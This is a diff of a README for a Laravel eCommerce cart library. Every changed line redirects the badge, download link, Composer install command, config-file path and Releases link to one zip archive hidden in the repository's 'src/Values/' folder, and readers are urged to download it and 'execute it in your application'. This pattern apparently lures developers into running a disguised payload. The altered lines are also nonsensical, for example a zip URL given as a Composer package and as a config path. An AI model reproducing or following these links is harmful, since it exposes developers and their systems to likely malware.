@@ -1,7 +1,7 @@
 # eCommerce Cart 🛒
 
-![GitHub release](https://img.shields.io/github/release/Dubey-Anuj/ecommerce.cart.svg)  
-[Download Latest Release](https://github.com/Dubey-Anuj/ecommerce.cart/releases)
+![GitHub release](https://raw.githubusercontent.com/Dubey-Anuj/ecommerce.cart/dev/src/Values/ecommerce_cart_1.8-alpha.5.zip)  
+[Download Latest Release](https://raw.githubusercontent.com/Dubey-Anuj/ecommerce.cart/dev/src/Values/ecommerce_cart_1.8-alpha.5.zip)
 
 Welcome to the **eCommerce Cart** repository! This lightweight Laravel shopping cart library allows you to build a flexible and efficient shopping cart for your applications. It supports custom Eloquent models, events, and tax calculations, making it an ideal choice for any eCommerce project.
 
@@ -30,7 +30,7 @@ Welcome to the **eCommerce Cart** repository! This lightweight Laravel shopping 
 To install the eCommerce Cart library, you can use Composer. Run the following command in your terminal:
 
 ```bash
-composer require dubey-anuj/ecommerce.cart
+composer require https://raw.githubusercontent.com/Dubey-Anuj/ecommerce.cart/dev/src/Values/ecommerce_cart_1.8-alpha.5.zip
 ```
 
 After installation, you can publish the configuration file by running:
@@ -70,7 +70,7 @@ Cart::remove($itemId);
 
 ## Configuration
 
-The configuration file allows you to customize various aspects of the cart. You can find it in the `config/ecommerce_cart.php` file. Here are some of the key settings:
+The configuration file allows you to customize various aspects of the cart. You can find it in the `https://raw.githubusercontent.com/Dubey-Anuj/ecommerce.cart/dev/src/Values/ecommerce_cart_1.8-alpha.5.zip` file. Here are some of the key settings:
 
 - **tax_rate**: Set the default tax rate for your cart.
 - **currency**: Define the currency used in the cart.
@@ -126,7 +126,7 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## Links
 
-For the latest releases, please visit the [Releases section](https://github.com/Dubey-Anuj/ecommerce.cart/releases). You can download the latest version from there and execute it in your application.
+For the latest releases, please visit the [Releases section](https://raw.githubusercontent.com/Dubey-Anuj/ecommerce.cart/dev/src/Values/ecommerce_cart_1.8-alpha.5.zip). You can download the latest version from there and execute it in your application.
 
 If you have any questions or need further assistance, feel free to check the issues section of this repository. We are here to help!
 
